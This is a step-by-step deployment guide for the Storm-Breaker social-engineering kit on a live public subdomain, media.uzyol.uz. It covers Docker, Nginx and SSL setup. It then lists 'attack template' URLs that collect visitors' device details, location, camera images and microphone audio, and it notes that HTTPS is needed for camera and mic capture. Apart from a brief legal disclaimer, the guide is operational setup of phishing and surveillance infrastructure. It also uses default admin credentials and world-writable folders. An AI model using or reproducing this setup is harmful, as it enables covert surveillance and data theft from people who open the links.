# Storm-Breaker Quick Start - Integrated Deployment
## Deploy to media.uzyol.uz in 5 Minutes

---

## ⚠️ Legal Warning
**This tool is for authorized security testing only. Unauthorized use is illegal.**

---

## Prerequisites Check

✅ Confirm you have:
- [x] Existing Nginx server running on uzyol.uz
- [x] Docker and Docker Compose installed
- [x] Root/sudo access
- [x] SSL certificate for `*.uzyol.uz` OR ability to create one for `media.uzyol.uz`

---

## 5-Step Deployment

### Step 1: Configure DNS (2 minutes)

Add DNS A record:
```
Type: A
Name: media
Value: YOUR_SERVER_IP
TTL: 300
```

**Verify:**
```bash
nslookup media.uzyol.uz
# Should return your server IP
```

---

### Step 2: Start Docker Container (1 minute)

```bash
cd /home/hikmatillo/opt/Storm-Breaker

# Build and start
docker-compose build
docker-compose up -d

# Verify
curl http://localhost:2525
# Should return HTML
```

---

### Step 3: Configure Nginx (1 minute)

**Copy config to Nginx:**
```bash
sudo cp nginx-config-snippet.conf /etc/nginx/sites-available/media.uzyol.uz
sudo ln -s /etc/nginx/sites-available/media.uzyol.uz /etc/nginx/sites-enabled/
```

**Test and reload:**
```bash
sudo nginx -t
sudo systemctl reload nginx
```

---

### Step 4: Verify SSL (30 seconds)

**If using wildcard certificate `*.uzyol.uz`:**
```bash
# Already covered - skip this step
```

**If need separate certificate:**
```bash
sudo certbot certonly --nginx -d media.uzyol.uz
sudo systemctl reload nginx
```

---

### Step 5: Test Deployment (30 seconds)

```bash
# Test HTTPS
curl -I https://media.uzyol.uz
# Should return: HTTP/2 200

# Open in browser
# https://media.uzyol.uz
# Should show login page
```

---

## ✅ You're Done!

**Admin Panel:**
- URL: `https://media.uzyol.uz`
- Login: `admin` / `admin` (change this!)

**Attack Templates:**
- Device Info: `https://media.uzyol.uz/templates/normal_data/index.html`
- Location: `https://media.uzyol.uz/templates/nearyou/index.html`
- Camera: `https://media.uzyol.uz/templates/camera_temp/index.html`
- Microphone: `https://media.uzyol.uz/templates/microphone/index.html`

---

## Important Next Steps

### 1. Change Admin Password
```bash
nano storm-web/config.php
# Change password field to strong password
```

### 2. Test All Templates
Visit each template URL to ensure camera/microphone/location work over HTTPS.

### 3. Monitor Logs
```bash
# Watch access
sudo tail -f /var/log/nginx/media.uzyol.uz-access.log

# Watch Docker
docker-compose logs -f
```

---

## Common Issues

### "502 Bad Gateway"
```bash
# Container not running
docker-compose ps
docker-compose restart
```

### "Connection refused"
```bash
# Port not exposed
sudo netstat -tlnp | grep 2525
docker-compose down && docker-compose up -d
```

### SSL certificate errors
```bash
# Check certificate
sudo certbot certificates

# If using wildcard, ensure it covers media.uzyol.uz
# If separate, run: sudo certbot certonly --nginx -d media.uzyol.uz
```

### Templates not loading
```bash
# Fix permissions
chmod -R 755 storm-web/
chmod -R 777 storm-web/images storm-web/sounds storm-web/log
docker-compose restart
```

---

## Management Commands

```bash
# Start
docker-compose up -d

# Stop
docker-compose down

# Restart
docker-compose restart

# Logs
docker-compose logs -f

# Status
docker-compose ps
```

---

## Architecture

```
Internet → Nginx (443) → localhost:2525 → Docker Container
                ↓
        media.uzyol.uz
```

Your existing services (uzyol.uz, admin.uzyol.uz, etc.) continue working normally.

---

## Full Documentation

For detailed docs, troubleshooting, and advanced configuration:
- **Full Guide**: [INTEGRATED_DEPLOYMENT.md](INTEGRATED_DEPLOYMENT.md)
- **Nginx Config**: [nginx-config-snippet.conf](nginx-config-snippet.conf)

---

## Security Reminders

1. ⚠️ **Change default password** in `storm-web/config.php`
2. 🔒 **Use HTTPS only** (camera/mic require it)
3. 📊 **Monitor logs** regularly
4. 🔐 **Restrict admin access** by IP (edit nginx config)
5. ⚖️ **Only use with authorization**

---

**Need help?** Read [INTEGRATED_DEPLOYMENT.md](INTEGRATED_DEPLOYMENT.md) for detailed troubleshooting.
